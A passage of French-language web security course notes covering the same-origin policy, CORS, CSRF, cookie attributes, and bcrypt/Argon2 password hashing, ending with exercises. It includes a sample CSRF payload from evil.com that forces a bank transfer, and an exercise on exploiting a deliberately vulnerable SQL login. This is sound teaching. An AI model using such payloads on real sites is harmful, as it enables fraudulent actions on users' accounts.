https://example.com:8080/data    ← Origine DIFFERENTE (port different)

La SOP interdit a un script sur origin A de lire la reponse d'un fetch vers origin B.
→ C'est ce qui empeche un site malveillant de lire vos emails Gmail via JavaScript.
```

### CORS : autoriser les requetes cross-origin

```
Scenario :
Frontend sur https://monsite.com fait un fetch vers https://api.monsite.com

1. Le navigateur envoie la requete avec l'en-tete :
   Origin: https://monsite.com

2. Le SERVEUR API repond avec :
   Access-Control-Allow-Origin: https://monsite.com
   → Le navigateur autorise la lecture de la reponse

   OU :
   Access-Control-Allow-Origin: *
   → Tout le monde peut lire (utile pour les API publiques)
```

### Requete preflight (OPTIONS)

```
Pour les requetes "complexes" (PUT, DELETE, headers custom, JSON body),
le navigateur envoie d'abord une requete OPTIONS :

Navigateur                                   Serveur
    │                                           │
    │── OPTIONS /api/users ─────────────────────>│
    │   Origin: https://monsite.com             │
    │   Access-Control-Request-Method: DELETE    │
    │   Access-Control-Request-Headers: Content-Type
    │                                           │
    │<── 204 No Content ────────────────────────│
    │   Access-Control-Allow-Origin: https://monsite.com
    │   Access-Control-Allow-Methods: GET, POST, DELETE
    │   Access-Control-Allow-Headers: Content-Type
    │   Access-Control-Max-Age: 86400           │
    │                                           │
    │── DELETE /api/users/42 ───────────────────>│  (requete reelle)
    │   Origin: https://monsite.com             │
    │                                           │
    │<── 200 OK ────────────────────────────────│
```

```javascript
// ─── Configuration CORS avec Express ───
const cors = require("cors");

// Trop permissif (eviter en production)
app.use(cors());

// Configuration restrictive (recommandee)
app.use(cors({
    origin: ["https://monsite.com", "https://admin.monsite.com"],
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Content-Type", "Authorization"],
    credentials: true,  // Autoriser les cookies
    maxAge: 86400       // Cache le preflight pendant 24h
}));
```

> [!warning] CORS n'est pas une protection serveur
> CORS est une restriction **du navigateur**. Un outil comme `curl` ou Postman ignore completement CORS. CORS protege les utilisateurs du navigateur contre les sites malveillants, mais ne remplace pas l'authentification et l'autorisation cote serveur.

---

## 15. CSRF (Cross-Site Request Forgery)

```
Attaque CSRF :
──────────────
1. L'utilisateur est connecte a banque.com (cookie de session actif)
2. L'utilisateur visite un site malveillant (evil.com)
3. evil.com contient :
   <img src="https://banque.com/transfer?to=attacker&amount=10000" />
   OU
   <form action="https://banque.com/transfer" method="POST" id="f">
       <input type="hidden" name="to" value="attacker" />
       <input type="hidden" name="amount" value="10000" />
   </form>
   <script>document.getElementById("f").submit();</script>

4. Le navigateur envoie automatiquement les cookies de banque.com
5. Le serveur croit que c'est une requete legitime de l'utilisateur !
```

### Prevention CSRF

```
1. Token CSRF (Synchronizer Token)
   ────────────────────────────────
   - Le serveur genere un token unique par session/formulaire
   - Le token est inclus dans un champ hidden du formulaire
   - Le serveur verifie le token a chaque soumission
   - evil.com ne peut PAS connaitre ce token (SOP l'empeche)
```

```html
<!-- Le token CSRF est genere cote serveur et insere dans le formulaire -->
<form action="/transfer" method="POST">
    <input type="hidden" name="csrf_token" value="a7f3b2c9d8e1..." />
    <input type="text" name="to" />
    <input type="number" name="amount" />
    <button type="submit">Transferer</button>
</form>
```

```
2. Cookie SameSite
   ────────────────
   Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly

   SameSite=Strict : le cookie n'est JAMAIS envoye par un site tiers
   SameSite=Lax    : envoye pour les navigations (liens) mais pas les POST
   SameSite=None   : toujours envoye (necessite Secure, a eviter)
```

---

## 16. Cookies Securises

```
Set-Cookie: session_id=abc123;
            HttpOnly;
            Secure;
            SameSite=Lax;
            Path=/;
            Max-Age=3600;
            Domain=example.com

Attributs de securite :
┌──────────────┬────────────────────────────────────────────────────────┐
│ Attribut     │ Effet                                                  │
├──────────────┼────────────────────────────────────────────────────────┤
│ HttpOnly     │ Inaccessible depuis JavaScript (document.cookie)       │
│              │ → Protege contre le vol de cookie par XSS              │
│              │                                                        │
│ Secure       │ Transmis uniquement en HTTPS                           │
│              │ → Protege contre l'interception sur HTTP               │
│              │                                                        │
│ SameSite     │ Controle l'envoi cross-origin                          │
│              │ Strict = jamais cross-site                             │
│              │ Lax = liens OK, POST non                               │
│              │ → Protege contre CSRF                                  │
│              │                                                        │
│ Path         │ Restreint a un chemin specifique                       │
│              │                                                        │
│ Max-Age      │ Duree de vie en secondes (0 = supprimer)               │
│              │                                                        │
│ Domain       │ Domaine(s) autorise(s)                                │
└──────────────┴────────────────────────────────────────────────────────┘
```

> [!example] Configuration minimale recommandee pour un cookie de session
> ```
> Set-Cookie: sid=<valeur>;
>             HttpOnly;       ← Obligatoire (contre XSS)
>             Secure;         ← Obligatoire si HTTPS
>             SameSite=Lax;   ← Recommande (contre CSRF)
>             Max-Age=3600;   ← Expiration explicite
>             Path=/;         ← Restreindre au minimum
> ```

---

## 17. Hachage de Mots de Passe en Detail

### Pourquoi pas SHA-256 ?

```
Probleme : SHA-256 est TROP rapide pour les mots de passe

GPU moderne : ~10 milliards SHA-256/seconde
Mot de passe de 8 caracteres (minuscules + chiffres) :
  36^8 = ~2.8 trillions de combinaisons
  Temps : 2.8 * 10^12 / 10^10 = ~280 secondes = ~5 minutes

Avec bcrypt (cout 12) : ~3 000 hash/seconde
  Temps : 2.8 * 10^12 / 3000 = ~30 000 ans !
```

### bcrypt

```python
import bcrypt

# ─── Hacher un mot de passe ───
mot_de_passe = "MonSuperMotDePasse123!"
sel = bcrypt.gensalt(rounds=12)  # rounds = facteur de cout (2^12 iterations)
hash_mdp = bcrypt.hashpw(mot_de_passe.encode("utf-8"), sel)
# Resultat : $2b$12$LJ3m4ys3Lk0TSwMCL3yKmuGIF/ShMHhYVqQ3Y.L6ZlXFYDi1IfGP6
#             ^^^  ^^  ^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
#            algo cost       sel (22 car)              hash (31 car)

# ─── Verifier un mot de passe ───
tentative = "MonSuperMotDePasse123!"
if bcrypt.checkpw(tentative.encode("utf-8"), hash_mdp):
    print("Mot de passe correct")
else:
    print("Mot de passe incorrect")

# Le sel est INCLUS dans le hash → pas besoin de le stocker separement
```

### Argon2 (recommande par OWASP)

```python
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,       # Nombre d'iterations
    memory_cost=65536,  # Memoire en KB (64 MB)
    parallelism=4       # Threads paralleles
)

# ─── Hacher ───
hash_mdp = ph.hash("MonMotDePasse123!")
# $argon2id$v=19$m=65536,t=3,p=4$...

# ─── Verifier ───
try:
    ph.verify(hash_mdp, "MonMotDePasse123!")
    print("Correct")
    # Verifier si le hash doit etre re-genere (parametres obsoletes)
    if ph.check_needs_rehash(hash_mdp):
        nouveau_hash = ph.hash("MonMotDePasse123!")
        # Mettre a jour en base
except Exception:
    print("Incorrect")
```

```
Comparaison bcrypt vs Argon2 :
┌──────────────┬────────────────────────┬────────────────────────┐
│ Aspect       │ bcrypt                  │ Argon2                  │
├──────────────┼────────────────────────┼────────────────────────┤
│ Annee        │ 1999                    │ 2015                    │
│ Resistance   │ CPU (iterations)        │ CPU + Memoire + Parall. │
│ GPU resist.  │ Bonne                   │ Excellente              │
│ Limite mdp   │ 72 octets              │ Pas de limite           │
│ Config       │ cost (rounds)           │ time, memory, threads   │
│ Standard     │ Tres repandu            │ Recommande OWASP        │
│ Utiliser si  │ Deja en place          │ Nouveau projet          │
└──────────────┴────────────────────────┴────────────────────────┘
```

---

## 18. Resume des Defenses par Couche

```
┌──────────────────────────────────────────────────────────────────┐
│                        DEFENSE EN PROFONDEUR                      │
│                                                                    │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │  RESEAU : Firewall, HTTPS, rate limiting, WAF              │  │
│  │  ┌────────────────────────────────────────────────────┐    │  │
│  │  │  TRANSPORT : TLS 1.3, HSTS, certificats            │    │  │
│  │  │  ┌────────────────────────────────────────────┐    │    │  │
│  │  │  │  EN-TETES : CSP, X-Frame-Options, CORS     │    │    │  │
│  │  │  │  ┌────────────────────────────────────┐    │    │    │  │
│  │  │  │  │  AUTH : MFA, session, JWT, OAuth    │    │    │    │  │
│  │  │  │  │  ┌────────────────────────────┐    │    │    │    │  │
│  │  │  │  │  │  AUTHZ : RBAC, ABAC, ACL   │    │    │    │    │  │
│  │  │  │  │  │  ┌────────────────────┐    │    │    │    │    │  │
│  │  │  │  │  │  │  VALIDATION :       │    │    │    │    │    │  │
│  │  │  │  │  │  │  Input sanitization │    │    │    │    │    │  │
│  │  │  │  │  │  │  Parameterized SQL  │    │    │    │    │    │  │
│  │  │  │  │  │  │  Output encoding    │    │    │    │    │    │  │
│  │  │  │  │  │  │  ┌──────────────┐  │    │    │    │    │    │  │
│  │  │  │  │  │  │  │  DONNEES :    │  │    │    │    │    │    │  │
│  │  │  │  │  │  │  │  Chiffrement  │  │    │    │    │    │    │  │
│  │  │  │  │  │  │  │  bcrypt/argon │  │    │    │    │    │    │  │
│  │  │  │  │  │  │  │  Backups      │  │    │    │    │    │    │  │
│  │  │  │  │  │  │  └──────────────┘  │    │    │    │    │    │  │
│  │  │  │  │  │  └────────────────────┘    │    │    │    │    │  │
│  │  │  │  │  └────────────────────────────┘    │    │    │    │  │
│  │  │  │  └────────────────────────────────────┘    │    │    │  │
│  │  │  └────────────────────────────────────────────┘    │    │  │
│  │  └────────────────────────────────────────────────────┘    │  │
│  └────────────────────────────────────────────────────────────┘  │
│  + MONITORING : Logs, alertes, SIEM, incident response           │
└──────────────────────────────────────────────────────────────────┘
```

---

## Carte Mentale ASCII

```
                            Securite Web OWASP
                                   │
         ┌──────────┬──────────────┼──────────────┬──────────────┐
         │          │              │              │              │
     Top 10     Transport     En-tetes       Auth/Cookies    Hachage
         │          │              │              │              │
   ┌─────┼────┐   HTTPS/TLS     CSP           CSRF Token    bcrypt
   │     │    │   Handshake    X-Frame-Opt    SameSite      Argon2
   │     │    │   Let's Enc.   HSTS           HttpOnly      Sel auto
   │     │    │   Certificats  nosniff        Secure        Cout ajust.
   │     │    │
 Inject Access Crypto         CORS
 SQL    IDOR   bcrypt        Same-Origin
 XSS   Path   Argon2        Preflight
 Cmd    Authz  HTTPS        Allow-Origin
   │
   ├── Insecure Design (Threat model, STRIDE)
   ├── Misconfiguration (Debug, defaults)
   ├── Vulnerable Components (npm audit, Dependabot)
   ├── Auth Failures (Brute force, MFA)
   ├── Integrity Failures (Supply chain, SRI)
   ├── Logging Failures (Monitoring, alertes)
   └── SSRF (Filtrage URLs, reseaux prives)
```

---

## Exercices

### Exercice 1 : Audit de securite d'une application

Prenez le code du projet Todo App (cours precedent) ou une mini-application web et realisez un audit :
- Listez toutes les entrees utilisateur (inputs, URL params, localStorage)
- Pour chaque entree, identifiez les vulnerabilites possibles (XSS, injection)
- Verifiez que l'echappement HTML est correct
- Verifiez la gestion des erreurs (pas de stack traces exposees)
- Proposez des ameliorations concretes avec du code

### Exercice 2 : Implementer un systeme d'authentification securise

Creez un backend (Python Flask ou Node.js Express) avec :
- Inscription avec hachage Argon2/bcrypt
- Connexion avec rate limiting (max 5 tentatives/minute par IP)
- Session avec cookie HttpOnly + Secure + SameSite
- Token CSRF sur les formulaires
- Middleware de verification d'autorisation (roles admin/user)
- Logging des tentatives de connexion

### Exercice 3 : Challenge d'injection SQL

Creez une petite application volontairement vulnerable (a des fins d'apprentissage) :
- Page de login avec injection SQL possible
- Exploitez la vulnerabilite pour vous connecter sans mot de passe
- Exploitez pour extraire la liste des utilisateurs (UNION-based)
- Corrigez ensuite avec des requetes parametrees
- Documentez chaque etape

### Exercice 4 : Configuration des en-tetes de securite

Configurez un serveur web (Nginx ou Express) avec tous les en-tetes recommandes :
- Content-Security-Policy restrictive (pas de unsafe-inline)
- HSTS avec preload
- X-Frame-Options
- CORS configure pour autoriser un seul domaine frontend
- Testez avec https://securityheaders.com/ et visez la note A+

---

## Liens

- [[01 - Securite Memoire en C]]
- [[04 - SQL Avance et Administration]]
- [[07 - DevSecOps]]
- [[04 - JavaScript Moderne ES6+]]
